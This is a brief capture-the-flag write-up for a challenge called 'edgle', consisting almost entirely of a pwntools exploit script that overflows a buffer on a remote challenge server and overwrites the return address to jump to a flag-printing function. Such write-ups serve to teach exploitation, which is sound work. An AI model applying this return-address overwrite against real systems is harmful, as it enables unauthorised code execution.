# edgle
> LongChampion, 06/04/2020

## Challenge
Just a basic buffer overflow problem!

## Solution
```python
#!/usr/bin/env python2
from pwn import *

r = remote("jh2i.com", 50039)
get_flag_addr = 0x080484F6
payload = 'A' * 0x48 + p32(0) + p32(get_flag_addr)
r.sendlineafter("Avast!", payload)
print r.recvall()
```
